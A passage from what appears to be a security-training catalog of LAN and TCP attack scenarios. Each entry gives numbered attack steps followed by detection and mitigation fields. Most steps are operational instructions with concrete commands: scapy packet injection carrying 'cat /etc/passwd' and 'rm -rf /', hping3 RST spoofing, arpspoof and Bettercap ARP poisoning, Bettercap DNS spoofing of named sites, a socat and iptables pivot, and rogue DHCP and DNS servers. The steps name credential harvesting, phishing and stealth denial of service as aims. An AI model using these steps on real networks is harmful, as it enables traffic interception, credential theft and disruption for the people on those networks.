Attack Steps: Step 1: Set up a test Telnet/FTP server (e.g., vsftpd for FTP or Telnet on port 23). Have a client connect to it. Step 2: In Wireshark, monitor the TCP connection and identify active session details: IPs, ports, and TCP sequence (SEQ) and acknowledgment (ACK) numbers. Step 3: Create a spoofed TCP packet in scapy that appears to come from the legitimate client. For example, IP(src="client_ip", dst="ftp_server")/TCP(sport=1234, dport=21, seq=xxxx, ack=yyyy, flags="PA")/"USER attacker\r\n" Step 4: Send that packet into the network. The server will interpret it as valid input from the client. You can now inject PASS, ls, cat /etc/passwd, or rm -rf / depending on the shell access granted. Step 5: Because it’s a blind injection, you won't see the response unless you also redirect traffic using ARP spoofing or DNS hijack. Step 6: Try injecting full shell command chains if FTP supports remote execution. For Telnet, you can inject uname -a, whoami, etc. Step 7: Repeat injection if timing or SEQ is off — small changes can fix alignment. Step 8: Clean up after injection by stopping packet spoofing tools and reverting routing if you used MITM setup. This attack works because FTP/Telnet are plaintext and trust SEQ/ACK for authentication.
Vulnerability: Lack of input validation, plaintext protocol
Detection Method: Analyze commands sent to Telnet/FTP servers; compare session origin and timing
Solution: Disable Telnet/FTP; switch to SSH/SFTP; use stateful firewalls and IDS to catch rogue TCP SEQ injections
Tags: TCP ACK Spoof, FTP Injection, Command Hijack

Title: Spoofed ACK RST Injection
Scenario Description: Attacker injects a spoofed TCP Reset (RST) packet with a valid ACK to break an existing TCP connection (DoS or stealth attack).
Attack Steps: Step 1: Observe an active TCP connection between victim and server using Wireshark. Filter with tcp.port==80 or any relevant port. Note source/destination IPs and ports, and track the latest SEQ and ACK values. Step 2: Use hping3 or scapy to send a TCP RST packet that looks like it comes from one end of the connection. The command in hping3: hping3 -R -a victim_ip server_ip -p 80 -s 12345 --spoof victim_ip — Replace with actual ports. Step 3: Ensure the RST packet contains a matching or close SEQ/ACK value. If values are too off, the target will ignore it. Use --seq in hping3 or seq=x in scapy TCP header. Step 4: Once received, the target endpoint immediately closes the TCP connection, thinking it's legitimate. The victim sees a dropped or frozen connection (web page load fails, file transfer halts, login breaks). Step 5: You can do this from LAN or WAN (if firewall doesn’t block spoofed packets). Step 6: This is useful in stealth DoS scenarios or to forcibly disconnect VPNs, SSH sessions, or kill database queries. Step 7: Verify effectiveness by watching for RST packets in Wireshark or checking the application disconnect logs. Step 8: Repeat with slightly modified SEQ if the first RST isn’t accepted. Step 9: This does not require full MITM — only spoofed packets with proper timing.
Vulnerability: TCP does not authenticate packet origins
Detection Method: Monitor for unexpected TCP RST packets; alert on spoofed origins
Solution: Enable TCP RST rate-limiting; use IPsec or TLS; enable deep packet inspection for RST anomalies
Tags: RST Injection, TCP Kill, Stealth DoS

Title: Fake ACK to Prevent Retransmission
Scenario Description: Attacker spoofs TCP ACK packets to trick a sender into believing packets have been received, suppressing retransmission and sabotaging communication
Attack Steps: Step 1: Identify a target TCP connection — this could be a file transfer (e.g., FTP, HTTP download), or any client-server exchange. Use Wireshark to capture traffic and note the session's IP addresses, source/destination ports, and current TCP sequence and acknowledgment numbers. Step 2: Wait for or trigger a packet drop condition. This could be done by intentionally blocking a legitimate data packet from reaching its destination (e.g., by firewall, ARP spoof + DROP rule, or physical interference like Wi-Fi jamming). Step 3: As soon as the legitimate data packet is dropped or intercepted, immediately craft a spoofed TCP ACK packet using scapy. This fake ACK should appear to come from the recipient, confirming receipt of a packet it never got. For example: IP(src='receiver_ip', dst='sender_ip')/TCP(sport=dst_port, dport=src_port, seq=ack_num, ack=seq_num+len(data), flags='A'). Step 4: Send the fake ACK to the sender. The sender believes the packet was successfully delivered and won’t retransmit it, even though the real recipient never received it. Step 5: This causes silent data loss — the client may see file corruption, blank data, or broken streams. Step 6: To scale this, script continuous ACK injections for dropped packets. Tools like iptables can be used to drop specific outgoing packets while scapy injects forged ACKs. Step 7: You can combine this with selective ACK manipulation to suppress retransmission of only critical payloads (e.g., login credentials, key handshake packets). Step 8: This technique is especially damaging in long-lived TCP connections or when used to subtly corrupt data transfers. Step 9: To end the attack, stop the spoofing and re-enable legitimate traffic routing. This attack exploits the trust in ACKs in TCP flow control.
Impact: Silent data loss, stealth corruption, unreliable communication
Detection Method: Monitor for unacknowledged packets; analyze retransmission patterns; detect duplicate ACKs or missing SEQs
Solution: Use encrypted/authenticated transport protocols (e.g., TLS); enable TCP sequence validation on IDS/IPS devices
Tags: TCP ACK Injection, Packet Loss Abuse, Data Corruption

Title: Silent MITM Proxy
Scenario Description: Attacker replies to all ARP requests on the LAN, pretending to be any IP. This silently poisons caches and positions the attacker in the path of all traffic.
Attack Steps: Step 1: Connect your attacking machine to the same local network (LAN) as the victim(s). Use a tool like Bettercap or arpspoof. Step 2: Enable IP forwarding on your system so traffic can be routed: echo 1 > /proc/sys/net/ipv4/ip_forward (Linux). This makes your machine forward packets instead of breaking the connection. Step 3: Run a tool like Bettercap with this command: bettercap -iface eth0 then type net.probe on and net.recon on. Step 4: Enable silent ARP spoofing to respond to any IP request: set arp.spoof.fullduplex true, set arp.spoof.targets 192.168.1.0/24, and then arp.spoof on. Step 5: Now your machine will respond to all ARP requests, claiming to be whatever IP is being asked for — silently hijacking all flows. Step 6: Use Wireshark or Bettercap’s built-in sniffing to view all incoming and outgoing traffic. Since traffic is forwarded properly, no one will notice. Step 7: You can now inspect, modify, or redirect traffic — useful for password stealing, credential harvesting, or injecting content. Step 8: When done, type arp.spoof off, and disable IP forwarding: echo 0 > /proc/sys/net/ipv4/ip_forward. Step 9: Use arp -a on victim machines to see if ARP caches were poisoned. Tip: This works best on flat Layer 2 networks and is stealthy unless ARP monitoring is enabled.
Vulnerability: ARP protocol trusts replies without validation
Detection Method: Use ARP watch tools, monitor unexpected MAC/IP mapping changes
Solution: Use static ARP entries for gateways; enable Dynamic ARP Inspection (DAI) on switches
Tags: ARP Spoofing, Passive MITM, Network Recon

Title: Proxying for Default Gateway
Scenario Description: Attacker replies to ARP requests for the gateway IP, placing themselves between victim and internet, relaying all traffic transparently.
Attack Steps: Step 1: Identify the default gateway IP on the LAN by typing ip route or netstat -rn on your own machine. For example, it might be 192.168.1.1. Step 2: Run arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 to tell the victim (192.168.1.100) that YOU are the gateway. Then, in another terminal, run arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 to tell the router that YOU are the victim. This makes both ends route their traffic through you. Step 3: Enable IP forwarding so packets go through: echo 1 > /proc/sys/net/ipv4/ip_forward. Step 4: (Optional) Add firewall or NAT rules so traffic behaves properly: iptables -t nat -A POSTROUTING -j MASQUERADE. Step 5: Use Wireshark or tcpdump to sniff live traffic between the victim and the internet. Look for login pages, unencrypted credentials, or tokens. Step 6: Since you're just routing, no traffic breaks — the user experiences no issues. But now you can insert payloads, steal sessions, or log credentials. Step 7: You can also use Bettercap with set arp.spoof.targets <victimIP> and arp.spoof on to do the same. Step 8: Stop the attack by killing the arpspoof processes and flushing ARP tables: ip -s -s neigh flush all. Step 9: Confirm that arp -a shows the proper gateway MAC address restored.
Vulnerability: ARP spoofing and lack of MAC verification
Detection Method: Monitor ARP tables for MAC changes; log gateway ARP changes
Solution: Static ARP entries on endpoints; use gateway MAC filtering or switch port security

Title: DNS Redirection via MITM
Attack Type: Redirect DNS requests by spoofing responses
Scenario Description: Attacker intercepts DNS requests during MITM and replies with fake IP addresses for targeted domains, sending victims to malicious sites.
Attack Steps: Step 1: Set up MITM using ARP spoofing as in the above two rows. Use Bettercap or arpspoof to sit between the victim and the gateway. Step 2: Enable IP forwarding and sniff DNS requests using tcpdump udp port 53 or Wireshark. Look for domain names like example.com. Step 3: Use dnsspoof or Bettercap’s dns.spoof module. In Bettercap: set dns.spoof.domains facebook.com, set dns.spoof.address 192.168.1.66 (your malicious web server), then dns.spoof on. Step 4: Now, whenever the victim requests facebook.com, they will get your malicious IP instead of the real one. Step 5: Set up a fake website on your server using Apache, Nginx, or a phishing page with SEToolkit. Step 6: You can also spoof multiple domains (e.g., Gmail, Twitter, PayPal) by editing /etc/hosts and telling dnsspoof to use that as input. Step 7: Use Responder to automatically reply to all DNS queries with your IP, capturing usernames, hashes, or redirecting traffic. Step 8: You can combine this with SSL stripping or use a captive portal clone for full credential harvesting. Step 9: Stop spoofing by disabling the DNS spoof module and clearing ARP routes. This works best on HTTP or captive-portal networks. It is blocked by DNS-over-HTTPS.
Vulnerability: Trust in first DNS reply, no DNSSEC
Impact: Phishing, fake updates, session token theft
Detection Method: Monitor DNS response mismatch; detect rapid DNS reply timing from LAN
Solution: Use DNSSEC; force DoH/DoT; block spoofed UDP 53 replies via egress filtering; validate DNS over TLS or VPN
Tags: DNS Spoof, Phishing, Fake IP Redirection

Title: Firewall Bypass via Proxy
Attack Type: Pivoting via Proxy for Restricted IPs/VLANs
Scenario Description: Attacker uses MITM position to spoof responses from internal-only systems (e.g., 10.0.0.0/8) unreachable by victim directly. Used to bypass segmentation.
Attack Steps: Step 1: Assume attacker is on a shared segment with a victim system. The victim is in a restricted VLAN or DMZ, unable to reach internal-only IP ranges (e.g., 10.10.10.5). Step 2: Attacker uses ARP spoofing (arpspoof -i eth0 -t <victim_ip> <gateway_ip>) to become MITM between victim and gateway. Enable IP forwarding (echo 1 > /proc/sys/net/ipv4/ip_forward). Step 3: Attacker uses a tool like iptables or socat to intercept requests from the victim to unreachable IPs (e.g., 10.10.10.5). For example, create a proxy with socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80. Step 4: On the attacker’s system, map iptables rules to redirect packets: iptables -t nat -A PREROUTING -s <victim_ip> -d 10.10.10.5 -j REDIRECT --to-port 8080. Step 5: The victim's blocked request to 10.10.10.5 is silently intercepted by attacker and forwarded to the internal host. Step 6: This bypasses network segmentation controls, giving the victim indirect access to internal services. Step 7: This technique is used in lateral movement post-compromise or to exfiltrate data via pivot paths. Step 8: Clean up by removing iptables rules and stopping socat. Step 9: Monitor victim access logs to confirm proxy use or fingerprint abnormal TTLs from responses.
Vulnerability: Flat Layer 2 allows proxy pivot via MITM
Detection Method: Monitor for anomalous traffic to forbidden IPs, detect unauthorized ARP or NAT rules
Solution: Enforce VLAN isolation, use strict egress ACLs, and layer 3 firewalls with MAC-IP validation

Title: Proxy for Downed Hosts
Scenario Description: Attacker impersonates a legitimate but powered-off or unreachable host by responding to traffic in its place, avoiding detection or blackhole alerts.
Attack Steps: Step 1: Attacker identifies a host that’s currently offline or powered down but still statically addressed on the network — e.g., legacy database at 192.168.0.50. Step 2: Confirm the host is down using ping 192.168.0.50 or arping -c 3 192.168.0.50. No replies confirm it’s silent. Step 3: Attacker configures their NIC to spoof that IP: ifconfig eth0:1 192.168.0.50 netmask 255.255.255.0 up. Also use arp -s 192.168.0.50 <attacker_mac> to assign ARP mapping. Step 4: Now attacker is listening as the original host. Any connection attempts will go to attacker. Step 5: Set up a fake service (e.g., HTTP or SMB) using Responder, Python HTTP server, or netcat to respond and log queries. Step 6: If internal monitoring expects the host to reply (e.g., ping or SNMP checks), the attacker now keeps the illusion alive. Step 7: This allows persistence (you look like an allowed host), and you evade blackhole alerts since the IP is responsive. Step 8: It also enables phishing or credential theft by posing as a known asset. Step 9: Cleanup involves ifconfig eth0:1 down and removing the ARP mapping with arp -d. Monitor MAC changes in logs for detection.
Vulnerability: No ARP verification or host availability checks
Detection Method: Log MAC/IP mapping changes, alert if host type doesn’t match MAC/vendor
Solution: Enforce NAC (Network Access Control), host fingerprinting, or alert on changes in MAC address per IP
Tags: Host Impersonation, Silent Proxy, Stealth Persistence

Title: Proxy ARP Flooding
Attack Type: CAM Table Overflow / Proxy ARP Response Flooding
Scenario Description: Attacker floods proxy ARP replies for multiple IPs across subnets, poisoning caches and enabling widespread MITM or denial of routing consistency.
Attack Steps: Step 1: Connect to the target network segment with a machine capable of sending ARP packets. Use Linux, Kali, or Parrot OS. Step 2: Launch scapy or ettercap. In scapy, use a loop to craft ARP replies like this: send(ARP(op=2, pdst="192.168.0.5", hwdst="ff:ff:ff:ff:ff:ff", psrc="10.0.0.1", hwsrc=<attacker_mac>)) to claim many IPs. Step 3: Repeat for a large range (hundreds) of IPs across different subnets (e.g., 192.168.1.0/24, 10.1.1.0/24, 172.16.0.0/16). Step 4: Switches and endpoints cache these replies and associate those IPs with attacker MAC. This overloads ARP tables and poisons legitimate routes. Step 5: Use this as a base for man-in-the-middle attacks across subnets or disrupt communication by corrupting the ARP cache. Step 6: Combine with sniffing tools like Wireshark or Bettercap to collect victim traffic. Step 7: This technique can also serve to bypass layer-3 firewalls that rely on subnet-based ACLs, because Layer 2 is now poisoned. Step 8: Detection involves sudden ARP table growth, inconsistent MAC/IP logs, and route failure. Step 9: End the attack by stopping scapy script and flushing ARP entries using ip -s -s neigh flush all. Use arpwatch for monitoring.
Vulnerability: Lack of ARP rate limits, switch CAM exhaustion
Detection Method: Monitor CAM/ARP table size; alert on unknown subnet activity
Solution: Enable ARP inspection, segment ARP domains by VLAN, limit number of ARP entries per port on managed switches
Tags: ARP Flood, Proxy ARP, VLAN Poisoning

Title: Proxy for Print/IoT Servers
Scenario Description: Attacker spoofs the ARP table entries of printers, CCTV cameras, or IoT devices to intercept print jobs, video streams, or sensitive data flows.
Attack Steps: Step 1: Attacker gains access to the local network segment where the printer or IoT devices are connected. Step 2: Using arpspoof or Bettercap, attacker sends forged ARP replies to victim devices (e.g., workstation) and to the targeted printer or IoT device, associating the attacker’s MAC address with the IP addresses of each other. For example: arpspoof -i eth0 -t <victim_ip> <printer_ip> and vice versa, effectively becoming a man-in-the-middle. Step 3: Enable IP forwarding on the attacker machine (echo 1 > /proc/sys/net/ipv4/ip_forward) to relay traffic seamlessly without disruption. Step 4: Start packet capture tools like Wireshark or tcpdump on attacker machine to sniff and log all traffic between the victim and the printer or IoT device, capturing print jobs, surveillance video streams, or control commands. Step 5: Analyze the captured traffic for sensitive content such as unencrypted print documents, passwords sent to IoT devices, or video feeds. Step 6: Optionally, attacker can modify or inject commands in the intercepted traffic (e.g., print altered documents or disrupt CCTV feeds). Step 7: To maintain stealth, attacker periodically refreshes ARP spoofing to keep the MITM position alive and monitors for detection mechanisms such as ARP table changes or network alerts. Step 8: Upon completion, attacker clears IP forwarding and ARP entries to remove traces. Detection involves monitoring ARP cache changes and unusual traffic patterns to/from printers/IoT devices.
Vulnerability: Lack of ARP authentication, unencrypted traffic
Detection Method: Monitor ARP cache for suspicious changes; use IDS/IPS to detect MITM patterns
Solution: Use static ARP entries, encrypted protocols (e.g., IPPS for printers), network segmentation, and NAC controls

Title: ARP Probe Injection
Attack Type: ARP Spoofing via Probe Response Injection
Scenario Description: Attacker responds to ARP probes from DHCP clients with spoofed replies to claim IP addresses, enabling takeover of IPs assigned by DHCP.
Attack Steps: Step 1: Attacker monitors network traffic with Bettercap or tcpdump to identify ARP probe packets broadcast by DHCP clients seeking IP address conflicts. Step 2: When a DHCP client broadcasts an ARP probe (e.g., "Who has IP 192.168.1.100?"), attacker immediately sends a forged ARP reply claiming that IP is owned by attacker’s MAC address. Step 3: This response arrives faster than legitimate owner, causing the DHCP client to believe attacker owns the IP, effectively hijacking the IP before DHCP lease assignment completes. Step 4: Attacker configures their NIC with the claimed IP to actively receive traffic meant for the victim, achieving a man-in-the-middle position. Step 5: From this position, attacker can intercept or modify network traffic, launch further attacks like DNS spoofing or credential theft. Step 6: Attacker may automate this process for many IPs using scapy scripts sending rapid ARP probe replies. Step 7: Detection requires monitoring ARP traffic anomalies, multiple MACs responding to the same IP, or DHCP server logs showing IP conflicts. Step 8: Prevention includes dynamic ARP inspection (DAI), DHCP snooping, and IP-MAC binding via network access control systems.
Vulnerability: No verification of ARP probe replies
Impact: IP hijacking, traffic interception, network disruption
Detection Method: Use network monitoring tools to detect rapid ARP probe replies or IP conflicts
Solution: Enable DHCP snooping, dynamic ARP inspection, and client isolation

Title: VPN Hijack via Proxy ARP
Attack Type: Proxy ARP to Hijack VPN Client Traffic
Scenario Description: Attacker uses proxy ARP spoofing on a VPN subnet to intercept VPN client’s tunneled traffic before encryption or after decryption.
Attack Steps: Step 1: Attacker gains local network access near the VPN client or gateway (e.g., public Wi-Fi, LAN). Step 2: Using ARP spoofing tools like Bettercap, attacker poisons ARP caches of VPN client and VPN gateway, associating their MAC address with each other’s IPs, thus positioning as MITM between VPN client and gateway. Step 3: Enable IP forwarding on attacker system to forward traffic to maintain connectivity and avoid detection (echo 1 > /proc/sys/net/ipv4/ip_forward). Step 4: Start packet capture tools like tcpdump or Wireshark to sniff VPN client traffic. Step 5: Because VPN encrypts payloads, attacker cannot directly read contents but can collect encrypted traffic for offline analysis. Step 6: If VPN uses weak encryption, or if keys leak, attacker may decrypt captured VPN packets offline using specialized tools (e.g., Wireshark with VPN decryption keys, if obtained). Step 7: Additionally, attacker can try SSL stripping on protocols tunneled inside VPN, or exploit VPN client vulnerabilities to weaken encryption. Step 8: To remain stealthy, attacker continuously refreshes ARP spoofing and monitors network for detection. Step 9: Detection involves monitoring ARP tables for unusual MAC-IP pairs and network anomalies at VPN endpoints. Step 10: Mitigation includes enforcing VPN endpoint authentication, strong encryption, and anti-ARP spoofing measures.
Vulnerability: ARP spoofing on VPN subnet; weak or exposed keys
Detection Method: Monitor ARP cache changes near VPN endpoints; alert on MITM signs in VPN traffic
Solution: Use strong VPN encryption, endpoint mutual authentication, anti-ARP spoofing, and encrypted DNS

Title: Persistence via ARP Proxy Scripts
Scenario Description: Attacker uses automated ARP proxy scripts on a compromised machine or device to maintain long-term MITM access by continuously spoofing ARP responses.
Tools Used: Bettercap, custom Python/bash ARP proxy scripts, arpspoof
Attack Steps: Step 1: Attacker initially gains access to a machine on the local network (via phishing, malware, or physical access). Step 2: On the compromised machine, attacker deploys an ARP proxy script that continuously listens for ARP requests on the network. Step 3: When an ARP request is detected (e.g., a client asking “Who has IP X?”), the script immediately sends a forged ARP reply associating the attacker’s MAC address with the requested IP. Step 4: This causes the requester to update its ARP cache, mapping the target IP to attacker MAC, effectively inserting attacker as man-in-the-middle (MITM). Step 5: The script runs persistently in background, ensuring ARP spoofing is re-applied continuously to survive network changes or device reboots. Step 6: Attacker enables IP forwarding on the compromised machine to relay intercepted traffic without disruption, keeping network connectivity intact. Step 7: The persistent ARP proxy script enables attacker to sniff, manipulate, or drop network traffic over extended periods stealthily. Step 8: The attacker can also update or modify the proxy script remotely to adjust targets or add new malicious features. Step 9: Detection is difficult unless network monitoring tools watch for frequent ARP changes or anomalies in ARP traffic patterns. Step 10: To remove persistence, administrators must identify and stop the ARP proxy scripts, clean the compromised machine, and implement network protections to prevent ARP spoofing.
Detection Method: Monitor ARP cache changes; use IDS/IPS for ARP anomalies; audit endpoint processes for suspicious scripts
Solution: Implement dynamic ARP inspection, network segmentation, endpoint security, and disable unnecessary services

Title: Fake DHCP Server Setup
Scenario Description: Attacker sets up a fake DHCP server on the network that assigns malicious IP addresses, gateways, or DNS servers to victims, redirecting or intercepting their traffic.
Attack Steps: Step 1: Attacker gains access to the local network (wired LAN, Wi-Fi, or guest network). Step 2: Using tools like Yersinia or dhcpd, attacker configures and launches a rogue DHCP server on the network, ensuring it listens for DHCP discovery packets from clients. Step 3: When a legitimate client sends a DHCP Discover broadcast to obtain network configuration, the rogue DHCP server responds with a DHCP Offer faster than the legitimate server, providing malicious parameters such as attacker-controlled IP address, default gateway, and DNS server. Step 4: Victim accepts the rogue DHCP Offer and configures their network interface using the attacker’s settings. Step 5: Because victim’s traffic is now routed through the attacker-controlled gateway or DNS, attacker can sniff, modify, or redirect victim’s traffic, including intercepting credentials or redirecting to phishing sites. Step 6: Attacker can also assign IP addresses causing denial-of-service by IP conflicts or network misconfigurations. Step 7: The rogue DHCP server continues to respond to DHCP requests, maintaining control over network clients dynamically as devices join or renew leases. Step 8: Detection involves monitoring DHCP server activity, unexpected IP assignments, or duplicate DHCP servers on the network. Step 9: Network admins can detect rogue DHCP servers by scanning for multiple DHCP offers or using DHCP snooping features on managed switches. Step 10: Mitigation includes enabling DHCP snooping and dynamic ARP inspection on switches, configuring static IPs or trusted DHCP servers, and segmenting network access.
Detection Method: DHCP server log monitoring; network scanning for rogue servers; alerts on multiple DHCP offers
Solution: Enable DHCP snooping, use static IP allocation where possible, deploy network access control (NAC) systems

Title: Fast Response DHCP Offer
Scenario Description: Attacker’s rogue DHCP server sends DHCP offers faster than legitimate server to trick clients into accepting malicious configs.
Attack Steps: Step 1: Attacker connects to the network and launches a rogue DHCP server configured to respond immediately to DHCP Discover messages. Step 2: When a client broadcasts a DHCP Discover request, both legitimate and rogue servers respond with DHCP Offers. Step 3: Because the attacker’s DHCP server replies faster, the victim accepts the attacker’s DHCP Offer, ignoring legitimate server offers. Step 4: Victim configures IP, gateway, and DNS per attacker’s settings, enabling attacker to intercept or manipulate victim’s traffic. Step 5: Attacker may alter DNS settings to redirect victim to malicious sites, intercept credentials, or deliver malware. Step 6: The attacker continuously monitors for new DHCP Discover requests and sends rapid DHCP Offers to maintain control. Step 7: Detection includes monitoring timing of DHCP offers and observing conflicting configurations. Step 8: Preventive measures include enforcing DHCP snooping on switches and restricting unauthorized DHCP servers. Step 9: Network admins can use tools like dhcp_probe or nmap to detect fast rogue DHCP responders. Step 10: Regular network audits help identify DHCP misconfigurations or unexpected offers.
Vulnerability: No validation of DHCP offer order
Detection Method: Monitor DHCP logs for timing anomalies and IP conflicts; IDS alerts for duplicate DHCP servers
Solution: Enable DHCP snooping, restrict physical access to network devices, use static IPs for critical systems

Title: Malicious DNS Server Assignment
Scenario Description: Rogue DHCP server assigns attacker-controlled DNS servers to victims to hijack domain resolution.
Attack Steps: Step 1: Attacker sets up a rogue DHCP server that includes malicious DNS server IP addresses in DHCP Offer packets. Step 2: When clients accept these DHCP offers, they configure their network stacks to use attacker-controlled DNS servers. Step 3: Victims send DNS queries to attacker’s DNS server, which responds with forged DNS responses redirecting users to phishing, malware, or fake update sites. Step 4: Attacker can intercept or manipulate all domain resolutions for victims, potentially bypassing HTTPS if users ignore browser warnings. Step 5: DNS server can log queries for reconnaissance or use DNS-based tunnels for covert communication. Step 6: The rogue DHCP server continues serving malicious DNS info for all DHCP renewals or new clients. Step 7: Detection involves monitoring DHCP configurations and DNS query logs for unexpected DNS servers. Step 8: Network security tools can flag DNS responses with inconsistent IP mappings or known malicious domains. Step 9: Mitigation includes enforcing DNS server assignment policies, DHCP snooping, and using DNSSEC to validate DNS data. Step 10: Educate users on recognizing SSL/TLS warnings and implement endpoint DNS filtering for safety.
Vulnerability: No validation of DNS server in DHCP
Detection Method: Monitor DNS traffic for suspicious domains or anomalous DNS servers; DHCP logs for unauthorized configs
Solution: Implement DHCP snooping, enforce DNSSEC, use trusted DNS servers, apply endpoint protections

Title: DNS Cache Poisoning via Rogue DNS
Scenario Description: Attacker sends fake DNS responses to poison the DNS cache on victim machines or local DNS servers, redirecting users to malicious sites.
Tools Used: dnsspoof, ettercap, Bettercap, custom DNS spoofers
Attack Steps: Step 1: Attacker gains access to the network or becomes man-in-the-middle via ARP spoofing or rogue DHCP server. Step 2: Attacker monitors DNS queries sent by victim machines or intercepts queries forwarded by local DNS servers. Step 3: When a DNS query for a target domain (e.g., www.bank.com) is observed, attacker immediately sends a forged DNS response claiming to be authoritative, containing a malicious IP address pointing to a phishing or malware site. Step 4: Victim or local DNS caches the fake DNS record, causing subsequent requests to the target domain to resolve to the attacker’s IP. Step 5: Victims unaware of the change visit the fake site, potentially entering credentials or downloading malware. Step 6: The attacker can maintain the spoofed entries by continually responding to DNS queries or poisoning cache refresh requests. Step 7: This poisoning can spread if upstream DNS servers accept and cache fake responses. Step 8: Detection requires monitoring DNS logs for unusual response IPs or domains and anomalies in DNS traffic patterns. Step 9: Network admins can use DNSSEC validation and monitor for discrepancies between recursive and authoritative DNS responses. Step 10: Prevention includes enforcing DNSSEC, limiting cache TTLs, and deploying secure DNS resolvers and filtering tools.
Detection Method: DNS logs anomaly detection; use DNS monitoring tools; alert on unexpected DNS records
Solution: Implement DNSSEC, use trusted DNS resolvers, apply DNS filtering, and educate users on SSL warnings

Title: Persistent Rogue DHCP
Scenario Description: Attacker continually runs rogue DHCP server to maintain control over clients’ network configuration for long-term MITM.
Attack Steps: Step 1: Attacker gains network access and deploys a rogue DHCP server configured to assign attacker-controlled IP, gateway, and DNS settings. Step 2: Attacker ensures the rogue DHCP server is always active and ready to respond to DHCP Discover or Request messages from clients. Step 3: When clients reboot or renew DHCP leases, attacker’s DHCP server responds faster than legitimate servers, forcing victims to accept attacker’s network configuration. Step 4: This continuous presence ensures that even if a victim temporarily disconnects or network changes, the attacker regains control immediately upon reconnection or lease renewal. Step 5: The attacker enables IP forwarding on their device to relay traffic and remain undetected while sniffing or manipulating victim traffic. Step 6: The attacker may update DHCP options dynamically to alter DNS servers or routing to maintain stealth or escalate attack (e.g., redirecting to phishing sites). Step 7: Detection requires active network scanning for rogue DHCP servers and monitoring DHCP lease patterns for inconsistencies. Step 8: Network devices with DHCP snooping can block unauthorized DHCP servers and log suspicious activity. Step 9: Network admins should also monitor ARP tables for conflicts or rapid changes indicating MITM attempts. Step 10: Mitigation involves removing rogue DHCP devices, enabling DHCP snooping, and enforcing network access controls.
Detection Method: DHCP server discovery tools; DHCP lease audits; network IDS/IPS alerts
Solution: DHCP snooping on switches, endpoint protection, network segmentation, strict physical network security

Title: Man-in-the-Middle via DNS Hijacking
Scenario Description: Attacker hijacks DNS queries by manipulating DNS configurations or poisoning to intercept and control victim DNS resolution.
Attack Steps: Step 1: Attacker gains MITM position through ARP spoofing, rogue DHCP, or network device compromise. Step 2: Attacker intercepts DNS queries from victim machines destined to legitimate DNS servers. Step 3: Attacker modifies DNS query packets or forges DNS responses to redirect victim’s DNS requests to attacker-controlled IP addresses. Step 4: Victims unknowingly connect to malicious sites instead of legitimate ones, allowing credential theft, malware delivery, or data interception. Step 5: Attacker may manipulate DNS TTLs to prolong the effect and maintain control over DNS resolution. Step 6: The hijacking can be targeted to specific domains or users to avoid detection. Step 7: Detection involves comparing DNS queries and responses for inconsistencies and monitoring for anomalous DNS traffic or IP mappings. Step 8: Network tools can flag sudden DNS changes or multiple DNS servers responding simultaneously. Step 9: Defenses include using encrypted DNS (DNS over HTTPS/TLS), DNSSEC validation, and strong network segmentation to limit attacker access. Step 10: Educate users to notice SSL/TLS certificate warnings and use endpoint security tools to detect suspicious DNS changes.
Detection Method: DNS traffic anomaly detection; certificate validation errors; network IDS/IPS for DNS anomalies
Solution: Deploy DNSSEC, DNS over HTTPS/TLS, network segmentation, endpoint monitoring

Title: DNS Tunneling via Rogue DNS
Scenario Description: Attacker uses DNS queries and responses to covertly exfiltrate sensitive data through rogue DNS servers.
Attack Steps: Step 1: Attacker sets up a rogue DNS server that handles specially crafted DNS queries used as data carriers. Step 2: Victim machine or malware running on victim encodes sensitive data (e.g., passwords, files) into DNS query subdomains (e.g., data1.attacker.com). Step 3: These DNS queries are sent out normally, reaching attacker’s rogue DNS server. Step 4: Rogue DNS server decodes the embedded data from query names and logs or forwards it to attacker. Step 5: The attacker may send responses encoded with commands or data to the victim, enabling command and control (C2) communication. Step 6: DNS tunneling traffic blends with normal DNS queries, making detection difficult without deep traffic analysis. Step 7: The attacker maintains the rogue DNS server continuously, waiting for new DNS query exfiltration. Step 8: Detection involves monitoring DNS traffic patterns for abnormal query lengths, frequent requests to uncommon domains, or unusual entropy. Step 9: Network admins should use DNS logging and anomaly detection tools to flag suspicious DNS usage. Step 10: Prevention includes restricting DNS to trusted resolvers, enforcing DNS filtering, using DNSSEC, and endpoint security to detect malware generating DNS tunnels.
Detection Method: Monitor DNS query size, frequency, entropy; use IDS/IPS with DNS anomaly detection
Solution: Block unauthorized DNS servers, implement DNS filtering and DNSSEC, monitor endpoints for tunneling malware

Title: Denial of Service via Invalid DHCP Lease
Scenario Description: Attacker assigns invalid subnet mask, gateway, or lease time causing network connectivity loss for clients.
Attack Steps: Step 1: Attacker gains access to network and launches a rogue DHCP server configured to send DHCP offers with incorrect IP configuration parameters (e.g., invalid subnet mask, gateway IP, or lease times). Step 2: Clients receive these incorrect DHCP offers and configure their network interface accordingly. Step 3: Due to invalid parameters, clients lose connectivity to the network or the Internet (e.g., cannot route packets, cannot renew lease). Step 4: This effectively causes denial-of-service (DoS) for affected clients without alerting administrators immediately. Step 5: The rogue DHCP server continues to respond to DHCP requests, maintaining network disruption. Step 6: Detection involves monitoring DHCP logs for unusual configuration parameters or sudden connectivity loss reports from clients. Step 7: Network monitoring tools can alert on abnormal DHCP traffic patterns or duplicated DHCP servers. Step 8: Network admins should isolate or remove rogue DHCP devices quickly to restore normal network function. Step 9: Implementing DHCP snooping prevents unauthorized DHCP servers from responding. Step 10: Use network segmentation and strong physical security to restrict unauthorized device connections.
Detection Method: DHCP logs anomaly detection; user complaints; IDS alerts on rogue DHCP servers
Solution: Enable DHCP snooping, restrict network access, deploy NAC, monitor DHCP server presence

Title: Rogue DHCP Starvation
Scenario Description: Attacker floods DHCP server with fake requests to exhaust available IP addresses, preventing legitimate clients from getting IPs.
